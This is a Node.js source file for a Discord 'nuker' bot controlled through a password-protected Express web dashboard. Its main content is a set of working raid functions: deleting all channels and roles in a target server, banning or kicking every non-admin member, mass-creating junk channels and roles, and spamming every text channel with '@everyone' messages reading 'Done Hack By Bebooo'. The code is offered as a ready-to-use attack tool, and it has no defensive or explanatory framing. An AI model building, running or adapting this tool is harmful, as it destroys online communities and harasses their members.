const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, StringSelectMenuBuilder, ButtonBuilder, ButtonStyle, ChannelType, PermissionsBitField, ActivityType } = require('discord.js');
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const session = require('express-session');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildPresences
    ] 
});

const TOKEN = 'توكن';
const OWNER_ID = '1078002756255748136';
const PORT = 3000;


const USERNAME = 'يوزرنيم';
const PASSWORD = 'باسورد';

let isProcessing = false;
let commandHistory = [];

// Bot config file
const CONFIG_FILE = './bot-config.json';

// Default config
let botConfig = {
    name: 'By Bebo',
    avatar: null,
    bio: '🛡️ نظام التحكم المتقدم',
    status: 'online',
    activity: {
        type: 'PLAYING',
        name: 'مع الخوادم 🎮'
    }
};

// Load config if exists
if (fs.existsSync(CONFIG_FILE)) {
    try {
        const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
        botConfig = { ...botConfig, ...saved };
    } catch (e) {}
}

app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'super_secret_key_123456789',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 3600000 }
}));

const requireLogin = (req, res, next) => {
    if (req.session && req.session.loggedIn) {
        next();
    } else {
        res.redirect('/login');
    }
};

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username === USERNAME && password === PASSWORD) {
        req.session.loggedIn = true;
        req.session.username = username;
        res.redirect('/dashboard');
    } else {
        res.send(`
            <script>
                alert('❌ خطأ في اسم المستخدم أو كلمة المرور!');
                window.location.href = '/login';
            </script>
        `);
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

app.get('/', (req, res) => {
    res.redirect('/login');
});

app.get('/dashboard', requireLogin, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/server/:id', requireLogin, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'server.html'));
});

app.get('/settings', requireLogin, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'settings.html'));
});

// API: Get bot config
app.get('/api/bot-config', requireLogin, (req, res) => {
    res.json({
        ...botConfig,
        avatar: botConfig.avatar || client.user?.displayAvatarURL({ dynamic: true }) || null
    });
});

// API: Update bot config
app.post('/api/bot-config', requireLogin, async (req, res) => {
    try {
        const { name, bio, status, activityType, activityName, avatar } = req.body;
        
        // Update config
        if (name) botConfig.name = name;
        if (bio !== undefined) botConfig.bio = bio;
        if (status) botConfig.status = status;
        if (activityType) botConfig.activity.type = activityType;
        if (activityName) botConfig.activity.name = activityName;
        if (avatar) botConfig.avatar = avatar;
        
        // Save config
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2));
        
        // Update bot presence
        await updateBotPresence();
        
        // Update bot username if changed
        if (name && client.user && client.user.username !== name) {
            await client.user.setUsername(name).catch((err) => {
                console.error('Failed to change username:', err);
            });
        }
        
        // Update bot avatar if changed and is base64
        if (avatar && avatar.startsWith('data:image')) {
            try {
                const base64Data = avatar.replace(/^data:image\/\w+;base64,/, '');
                const buffer = Buffer.from(base64Data, 'base64');
                await client.user.setAvatar(buffer).catch((err) => {
                    console.error('Failed to change avatar:', err);
                });
            } catch (e) {}
        }
        
        res.json({ success: true, config: botConfig });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

async function updateBotPresence() {
    if (!client.user) return;
    
    const status = botConfig.status || 'online';
    const activityType = botConfig.activity.type || 'PLAYING';
    const activityName = botConfig.activity.name || 'مع الخوادم 🎮';
    
    // Map status
    const statusMap = {
        'online': 'online',
        'idle': 'idle',
        'dnd': 'dnd',
        'invisible': 'invisible'
    };
    
    // Map activity type
    const activityMap = {
        'PLAYING': ActivityType.Playing,
        'STREAMING': ActivityType.Streaming,
        'LISTENING': ActivityType.Listening,
        'WATCHING': ActivityType.Watching,
        'COMPETING': ActivityType.Competing
    };
    
    try {
        await client.user.setPresence({
            status: statusMap[status] || 'online',
            activities: [{
                name: activityName,
                type: activityMap[activityType] || ActivityType.Playing,
                url: activityType === 'STREAMING' ? 'https://twitch.tv/yourchannel' : undefined
            }]
        });
        console.log(`✅ Bot presence updated: ${status} - ${activityType} ${activityName}`);
    } catch (error) {
        console.error('Failed to update presence:', error);
    }
}

app.get('/api/servers', requireLogin, (req, res) => {
    if (!client.isReady()) return res.json({ error: 'Bot not ready' });
    
    const servers = client.guilds.cache.map(g => {
        const members = g.members.cache;
        const onlineMembers = members.filter(m => m.presence?.status !== 'offline' && !m.user.bot).size;
        const botStatus = client.user?.presence?.status || 'online';
        
        return {
            id: g.id,
            name: g.name,
            icon: g.iconURL({ dynamic: true, size: 512 }),
            banner: g.bannerURL({ size: 512 }),
            owner: g.members.cache.get(g.ownerId)?.user?.tag || 'Unknown',
            ownerId: g.ownerId,
            members: g.memberCount,
            online: onlineMembers,
            channels: g.channels.cache.size,
            roles: g.roles.cache.size,
            bots: members.filter(m => m.user.bot).size,
            humans: members.filter(m => !m.user.bot).size,
            created: g.createdAt,
            boostCount: g.premiumSubscriptionCount || 0,
            boostLevel: g.premiumTier || 0,
            botStatus: botStatus
        };
    });
    
    res.json(servers);
});

app.get('/api/server/:id', requireLogin, (req, res) => {
    if (!client.isReady()) return res.json({ error: 'Bot not ready' });
    
    const guild = client.guilds.cache.get(req.params.id);
    if (!guild) return res.json({ error: 'Server not found' });
    
    const members = guild.members.cache;
    const onlineMembers = members.filter(m => m.presence?.status !== 'offline' && !m.user.bot).size;
    
    res.json({
        id: guild.id,
        name: guild.name,
        icon: guild.iconURL({ dynamic: true, size: 512 }),
        banner: guild.bannerURL({ size: 512 }),
        owner: guild.members.cache.get(guild.ownerId)?.user?.tag || 'Unknown',
        ownerId: guild.ownerId,
        members: guild.memberCount,
        online: onlineMembers,
        channels: guild.channels.cache.size,
        roles: guild.roles.cache.size,
        bots: members.filter(m => m.user.bot).size,
        humans: members.filter(m => !m.user.bot).size,
        created: guild.createdAt,
        boostCount: guild.premiumSubscriptionCount || 0,
        boostLevel: guild.premiumTier || 0
    });
});

app.post('/api/execute', requireLogin, async (req, res) => {
    if (isProcessing) {
        return res.json({ error: 'يوجد عملية قيد التنفيذ حالياً' });
    }
    
    const { serverId, action, data } = req.body;
    if (!serverId || !action) {
        return res.json({ error: 'بيانات غير صالحة' });
    }
    
    const guild = client.guilds.cache.get(serverId);
    if (!guild) {
        return res.json({ error: 'الخادم غير موجود' });
    }
    
    res.json({ status: 'started' });
    
    commandHistory.push({
        server: guild.name,
        action: action,
        time: new Date().toISOString(),
        status: 'running'
    });
    
    try {
        isProcessing = true;
        
        io.emit('progress', {
            status: `جاري تنفيذ: ${action}`,
            progress: 0
        });
        
        let result;
        switch(action) {
            case 'delete_channels':
                result = await deleteAllChannels(guild);
                break;
            case 'create_channels':
                result = await createChannels(guild, data);
                break;
            case 'delete_roles':
                result = await deleteAllRoles(guild);
                break;
            case 'create_roles':
                result = await createRoles(guild, data);
                break;
            case 'ban_all':
                result = await banAllMembers(guild);
                break;
            case 'kick_all':
                result = await kickAllMembers(guild);
                break;
            case 'spam_messages':
                result = await spamMessages(guild, data);
                break;
        }
        
        commandHistory[commandHistory.length - 1].status = 'completed';
        
        io.emit('complete', {
            success: true,
            message: `✅ تم تنفيذ العملية بنجاح`,
            result: result
        });
        
    } catch (error) {
        commandHistory[commandHistory.length - 1].status = 'failed';
        io.emit('error', { message: error.message });
    } finally {
        isProcessing = false;
    }
});

async function deleteAllChannels(guild) {
    const channels = guild.channels.cache;
    let count = 0;
    for (const channel of channels.values()) {
        await channel.delete().catch(() => {});
        count++;
    }
    return { deleted: count };
}

async function createChannels(guild, data) {
    const { name, count } = data;
    const created = [];
    for (let i = 0; i < count; i++) {
        const channel = await guild.channels.create({
            name: name || `By-Bebo-${i+1}`,
            type: ChannelType.GuildText
        }).catch(() => null);
        if (channel) created.push(channel.id);
    }
    return { created: created.length };
}

async function deleteAllRoles(guild) {
    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
    let count = 0;
    for (const role of roles.values()) {
        await role.delete().catch(() => {});
        count++;
    }
    return { deleted: count };
}

async function createRoles(guild, data) {
    const { name, color, count } = data;
    const created = [];
    for (let i = 0; i < count; i++) {
        const role = await guild.roles.create({
            name: name || `By-Bebo-${i+1}`,
            color: color || '#ff0000',
            permissions: []
        }).catch(() => null);
        if (role) created.push(role.id);
    }
    return { created: created.length };
}

async function banAllMembers(guild) {
    const members = guild.members.cache.filter(m => 
        !m.user.bot && 
        !m.permissions.has(PermissionsBitField.Flags.Administrator)
    );
    let count = 0;
    for (const member of members.values()) {
        await member.ban({ reason: 'By Bebo' }).catch(() => {});
        count++;
    }
    return { banned: count };
}

async function kickAllMembers(guild) {
    const members = guild.members.cache.filter(m => 
        !m.user.bot && 
        !m.permissions.has(PermissionsBitField.Flags.Administrator)
    );
    let count = 0;
    for (const member of members.values()) {
        await member.kick({ reason: 'By Bebo' }).catch(() => {});
        count++;
    }
    return { kicked: count };
}

async function spamMessages(guild, data) {
    const { message, count } = data;
    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
    let total = 0;
    for (const channel of channels.values()) {
        for (let i = 0; i < count; i++) {
            await channel.send(message || 'Done Hack By Bebooo @everyone').catch(() => {});
            total++;
        }
    }
    return { sent: total };
}

client.on('ready', async () => {
    console.log(`✅ ${client.user.tag} is online`);
    
    // Apply saved config
    if (botConfig.name && client.user.username !== botConfig.name) {
        await client.user.setUsername(botConfig.name).catch(() => {});
    }
    
    if (botConfig.avatar && botConfig.avatar.startsWith('data:image')) {
        try {
            const base64Data = botConfig.avatar.replace(/^data:image\/\w+;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            await client.user.setAvatar(buffer).catch(() => {});
        } catch (e) {}
    }
    
    await updateBotPresence();
    
    console.log(`🌐 Web interface running on http://localhost:${PORT}`);
});

client.login(TOKEN);

server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});